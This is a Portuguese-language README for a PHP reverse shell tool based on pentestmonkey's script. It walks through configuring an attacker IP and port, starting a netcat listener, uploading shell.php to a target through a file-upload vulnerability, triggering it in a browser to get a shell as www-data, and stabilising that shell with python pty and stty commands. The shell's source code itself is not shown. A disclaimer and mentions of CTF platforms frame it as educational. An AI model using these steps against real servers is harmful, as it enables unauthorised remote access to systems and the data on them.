# reverse_shell
Este script permite que um invasor obtenha um shell interativo em um servidor web alvo que execute PHP. Ele funciona estabelecendo uma conexão de volta para a máquina do invasor.
PHP Reverse Shell

Uma implementação de um reverse shell em PHP, baseada no popular script do pentestmonkey.

Este script permite que um invasor obtenha um shell interativo em um servidor web alvo que execute PHP. Ele funciona estabelecendo uma conexão de volta para a máquina do invasor.
⚠️ Aviso Legal

    Este script deve ser usado apenas para fins educacionais e em ambientes autorizados. A utilização desta ferramenta em sistemas aos quais você não possui permissão explícita é ilegal. O autor e os contribuidores não se responsabilizam por qualquer mau uso ou dano causado por este programa. Use por sua conta e risco.

Como Usar

Para executar este reverse shell, você precisa de duas partes: a máquina do invasor (onde você receberá a conexão) e a máquina do alvo (o servidor web que executará o script).
Passo 1: Configuração do Script

Antes de tudo, você precisa editar o arquivo shell.php para configurar o endereço IP e a porta do ouvinte (sua máquina).

Abra o arquivo e altere as seguintes linhas:

$ip = '10.10.10.10';  // <<< MUDE PARA O SEU IP DE ATACANTE
$port = 4444;       // <<< MUDE PARA A PORTA QUE VOCÊ VAI OUVIR

    $ip: Coloque o endereço IP da sua máquina. Se você estiver em uma VPN para uma plataforma de CTF (como HackTheBox ou TryHackMe), use o IP da sua interface tun0. Você pode encontrá-lo com o comando ifconfig tun0 ou ip addr show tun0.

    $port: Escolha uma porta que não esteja em uso na sua máquina. Portas como 4444, 1337 ou 9001 são comuns.

Passo 2: Iniciar o Ouvinte (Listener) na Sua Máquina

Na sua máquina de ataque, você precisa de um "ouvinte" para esperar e "pegar" a conexão que o servidor alvo enviará de volta. A ferramenta mais comum para isso é o Netcat (nc).

Abra um terminal e execute o seguinte comando, substituindo <SUA_PORTA> pela mesma porta que você configurou no script:

nc -lvnp <SUA_PORTA>

    -l: Modo de escuta (listen).

    -v: Modo verboso (mostra mais informações).

    -n: Não resolver DNS (mais rápido).

    -p: Especifica a porta.

Seu terminal ficará parado com uma mensagem como listening on [any] 4444.... Isso significa que ele está pronto e aguardando a conexão.
Passo 3: Executar o Shell no Servidor Alvo

Esta é a parte que depende do cenário:

    Faça o upload do arquivo shell.php (já configurado) para o servidor web alvo. Geralmente, isso é feito explorando uma vulnerabilidade de upload de arquivos.

    Acesse o script através do seu navegador. Navegue até a URL onde o arquivo foi salvo. Por exemplo:
    http://<IP_DO_ALVO>/uploads/shell.php

Passo 4: Obtenha o Acesso!

No momento em que você acessar o script no navegador, ele será executado no servidor. O servidor então se conectará de volta à sua máquina.

Olhe para o seu terminal onde o Netcat está rodando. Você deverá ver uma mensagem de conexão e, em seguida, um prompt de comando ($), que é o terminal do servidor alvo!

$ whoami
www-data
$ ls -la
.
..
index.html
shell.php

Melhorando o Shell (Shell Interativo)

O shell que você recebe do Netcat por padrão não é totalmente interativo (as setas, o autocompletar com Tab e o Ctrl+C podem não funcionar corretamente). Para "estabilizar" o shell e torná-lo totalmente funcional, siga estes passos:

    No shell do Netcat, execute o seguinte comando (pressupondo que o Python esteja instalado no alvo):

    python3 -c 'import pty; pty.spawn("/bin/bash")'

    Se o python3 não funcionar, tente com python.

    Na sua máquina local, pressione Ctrl+Z para colocar o processo do Netcat em segundo plano.

    Ainda na sua máquina local, execute o seguinte comando para ajustar seu terminal:

    stty raw -echo; fg

    Pressione Enter uma ou duas vezes. Pronto! Agora você tem um shell totalmente interativo.

Créditos

Este script é uma implementação popular do conceito de reverse shell, amplamente divulgado e mantido pela comunidade de segurança, com a versão original creditada a pentestmonkey.net.
